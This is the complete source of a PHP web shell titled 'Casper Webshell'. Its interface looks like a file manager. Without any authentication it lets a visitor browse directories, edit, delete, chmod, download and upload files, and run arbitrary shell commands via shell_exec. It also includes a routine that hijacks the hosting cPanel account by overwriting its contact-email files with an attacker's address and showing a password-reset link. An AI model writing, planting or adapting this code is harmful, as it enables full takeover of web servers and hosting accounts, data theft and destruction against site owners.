<?php

ini_set('display_errors', 0);

// Get current directory or default to root (htdocs)
$current_dir = isset($_GET['dir']) ? $_GET['dir'] : dirname(__FILE__);

if (!is_dir($current_dir)) {
    $current_dir = dirname(__FILE__);
}

$items = scandir($current_dir);

function formatBytes($size, $precision = 2) {
    $base = log($size, 1024);
    $suffixes = array('', 'KB', 'MB', 'GB', 'TB');   
    return round(pow(1024, $base - floor($base)), $precision) . ' ' . $suffixes[floor($base)];
}

$parent_dir = dirname($current_dir);
$editFileContent = '';

$directory = isset($_GET['dir']) ? $_GET['dir'] : '.';

$directory = realpath($directory) ?: '.';

$output = ''; // Variable to store command output

if (isset($_POST['action'])) {
    $action = $_POST['action'];
    $target = $_POST['target'] ?? '';

    switch ($action) {
        case 'delete':
            if (is_dir($target)) {
                deleteDirectory($target); // Call the recursive delete function
            } else {
                unlink($target);
            }
            break;

        case 'edit':
            if (file_exists($target)) {
                $editFileContent = file_get_contents($target);
            }
            break;

        case 'save':
            if (file_exists($target) && isset($_POST['content'])) {
                file_put_contents($target, $_POST['content']);
            }
            break;

        case 'chmod':
            if (isset($_POST['permissions'])) {
                chmod($target, octdec($_POST['permissions']));
            }
            break;

        case 'download':
            if (file_exists($target)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename=' . basename($target));
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($target));
                readfile($target);
                exit;
            }
            break;

        case 'upload':
            if (isset($_FILES['fileToUpload'])) {
                $file = $_FILES['fileToUpload'];

                // Check for errors
                if ($file['error'] === UPLOAD_ERR_OK) {
                    // Sanitize the file name
                    $fileName = basename($file['name']);
                    $targetPath = $current_dir . DIRECTORY_SEPARATOR . $fileName;

                    // Move the uploaded file to the target directory
                    if (move_uploaded_file($file['tmp_name'], $targetPath)) {
                        echo "<p>File uploaded successfully!</p>";
                    } else {
                        echo "<p>Failed to move uploaded file.</p>";
                    }
                } else {
                    echo "<p>Error uploading file: " . $file['error'] . "</p>";
                }
            }
            break;

        case 'execute':
            if (isset($_POST['command'])) {
                $command = $_POST['command'];
                // Execute the command and capture the output
                $output = shell_exec($command . ' 2>&1'); // Redirect stderr to stdout
            }
            break;
    }
}

function deleteDirectory($dir) {
    if (!is_dir($dir)) {
        return false;
    }

    $items = array_diff(scandir($dir), array('.', '..'));

    foreach ($items as $item) {
        $path = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_dir($path)) {
            deleteDirectory($path);
        } else {
            unlink($path);
        }
    }

    return rmdir($dir);
}

function reset_cpanel_password($email) {
    $user = get_current_user();
    $site = $_SERVER['HTTP_HOST'];
    $resetUrl = $site . ':2082/resetpass?start=1';
    
    $wr = 'email:' . $email;
    
    $f = fopen('/home/' . $user . '/.cpanel/contactinfo', 'w');
    fwrite($f, $wr);
    fclose($f);
    
    $f = fopen('/home/' . $user . '/.contactinfo', 'w');
    fwrite($f, $wr);
    fclose($f);
    
    echo '<br/><center>Password reset link: <a href="http://' . $resetUrl . '">' . $resetUrl . '</a></center>';
    echo '<br/><center>Username: ' . $user . '</center>';
}

if (isset($_POST['cpanel_reset'])) {
    $email = $_POST['email'];
    reset_cpanel_password($email);
}

$username = get_current_user();
$user = $_SERVER['USER'] ?? 'N/A';
$phpVersion = phpversion();
$dateTime = date('Y-m-d H:i:s');
$hddFreeSpace = disk_free_space("/") / (1024 * 1024 * 1024); // in GB
$hddTotalSpace = disk_total_space("/") / (1024 * 1024 * 1024); // in GB
$serverIP = $_SERVER['SERVER_ADDR'];
$clientIP = $_SERVER['REMOTE_ADDR'];
$cwd = getcwd();

$parentDirectory = dirname($directory);
$breadcrumbs = explode(DIRECTORY_SEPARATOR, $directory);
$breadcrumbLinks = [];
$breadcrumbPath = '';

foreach ($breadcrumbs as $crumb) {
    $breadcrumbPath .= $crumb . DIRECTORY_SEPARATOR;
    $breadcrumbLinks[] = '<a href="?dir=' . urlencode(rtrim($breadcrumbPath, DIRECTORY_SEPARATOR)) . '">' . htmlspecialchars($crumb) . '</a>';
}

$breadcrumbLinksString = implode(' / ', $breadcrumbLinks);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Casper Webshell</title>
    <script src=""></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }
        .file-manager {
            width: 80%;
            margin: 20px auto;
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        .file-manager h1 {
            text-align: center;
        }
        .system-info {
            margin-bottom: 20px;
            background-color: #f9f9f9;
            padding: 10px;
            border: 1px solid #ddd;
        }
        .file-list {
            width: 100%;
            border-collapse: collapse;
        }
        .file-list th, .file-list td {
            padding: 10px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }
        .file-list th {
            background-color: #f0f0f0;
        }
        .file-list tr:hover {
            background-color: #f9f9f9;
        }
        .actions {
            text-align: center;
            margin-bottom: 20px;
        }
        .actions button {
            margin-right: 10px;
            padding: 10px 20px;
            background-color: #007bff;
            color: #fff;
            border: none;
            cursor: pointer;
        }
        .actions button:hover {
            background-color: #0056b3;
        }
        .icon {
            margin-right: 5px;
        }
        .file-actions {
            display: flex;
            justify-content: center;
        }
        .file-actions form {
            display: inline;
        }
        .file-actions button {
            background: none;
            border: none;
            color: #007bff;
            cursor: pointer;
            font-size: 16px;
            margin: 0 5px;
            padding: 5px;
        }
        .file-actions button:hover {
            color: #0056b3;
        }
        .file-actions button i {
            margin-right: 0;
        }
        .edit-form {
            margin-top: 20px;
        }
        .edit-form textarea {
            width: 100%;
            height: 300px;
            font-family: monospace;
            font-size: 14px;
        }
        .edit-form button {
            background-color: #28a745;
            color: #fff;
            padding: 10px 20px;
            border: none;
            cursor: pointer;
        }
        .edit-form button:hover {
            background-color: #218838;
        }
        .reset-form {
            display: none;
            margin-top: 10px;
            background-color: #e9ecef;
            padding: 10px;
            border-radius: 5px;
            border: 1px solid #ced4da;
        }
        .reset-form input, .reset-form button {
            margin: 5px 0;
            padding: 10px;
            width: 100%;
            box-sizing: border-box;
            font-size: 14px;
        }
    </style>
</head>
<body>

<div class="file-manager">
    <h1>Casper Webshell</h1>
    
    <!-- System Information Section -->
    <div class="system-info">
        <p>Current User: <b><?php echo htmlspecialchars($username); ?></b></p>
        <p>Server IP: <b><?php echo htmlspecialchars($serverIP); ?></b></p>
        <p>Client IP: <b><?php echo htmlspecialchars($clientIP); ?></b></p>
        <p>Current Date and Time: <b><?php echo htmlspecialchars($dateTime); ?></b></p>
        <p>PHP Version: <b><?php echo htmlspecialchars($phpVersion); ?></b></p>
        <p>Free HDD Space: <b><?php echo round($hddFreeSpace, 2); ?> GB</b></p>
        <p>Total HDD Space: <b><?php echo round($hddTotalSpace, 2); ?> GB</b></p>
    </div>

    <!-- Breadcrumb Navigation -->
    <div class="breadcrumbs">
        <p>Current Directory: <?php echo $breadcrumbLinksString; ?></p>
    </div>

    <!-- File Manager Table -->
    <table class="file-list">
        <thead>
            <tr>
                <th>Name</th>
                <th>Size</th>
                <th>Type</th>
                <th>Actions</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($items as $item) :
                $itemPath = $current_dir . DIRECTORY_SEPARATOR . $item;
                $isDirectory = is_dir($itemPath);
                $type = $isDirectory ? 'Directory' : 'File';
                $icon = $isDirectory ? '<i class="fas fa-folder"></i>' : '<i class="fas fa-file"></i>';
            ?>
                <tr>
                    <td>
                        <?php echo $icon; ?>
                        <?php if ($isDirectory) : ?>
                            <a href="?dir=<?php echo urlencode($itemPath); ?>"><?php echo htmlspecialchars($item); ?></a>
                        <?php else : ?>
                            <?php echo htmlspecialchars($item); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $isDirectory ? '-' : formatBytes(filesize($itemPath)); ?></td>
                    <td><?php echo $type; ?></td>
                    <td>
                        <div class="file-actions">
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="edit">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                <button type="submit"><i class="fas fa-edit"></i> Edit</button>
                            </form>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="delete">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                <button type="submit"><i class="fas fa-trash"></i> Delete</button>
                            </form>
                            <form method="POST" style="display:inline;">
                                <input type="hidden" name="action" value="chmod">
                                <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                <input type="text" name="permissions" placeholder="0777">
                                <button type="submit"><i class="fas fa-lock"></i> Chmod</button>
                            </form>
                            <?php if (!$isDirectory) : ?>
                                <form method="POST" style="display:inline;">
                                    <input type="hidden" name="action" value="download">
                                    <input type="hidden" name="target" value="<?php echo htmlspecialchars($itemPath); ?>">
                                    <button type="submit"><i class="fas fa-download"></i> Download</button>
                                </form>
                            <?php endif; ?>
                        </div>
                    </td>
                </tr>
            <?php endforeach; ?>
        </tbody>
    </table>

    <!-- Edit Form -->
    <?php if (!empty($editFileContent)) : ?>
        <form method="POST" class="edit-form">
            <input type="hidden" name="action" value="save">
            <input type="hidden" name="target" value="<?php echo htmlspecialchars($target); ?>">
            <textarea name="content"><?php echo htmlspecialchars($editFileContent); ?></textarea>
            <button type="submit">Save</button>
        </form>
    <?php endif; ?>

    <!-- Upload Form -->
    <div class="actions">
        <form method="POST" enctype="multipart/form-data">
            <input type="hidden" name="action" value="upload">
            <input type="file" name="fileToUpload">
            <button type="submit">Upload</button>
        </form>
    </div>

    <!-- Execute Form -->
    <div class="actions">
        <form method="POST">
            <input type="hidden" name="action" value="execute">
            <input type="text" name="command" placeholder="Enter command">
            <button type="submit">Execute</button>
        </form>
        <?php if ($output) : ?>
            <pre><?php echo htmlspecialchars($output); ?></pre>
        <?php endif; ?>
    </div>

</div>
</body>
</html>
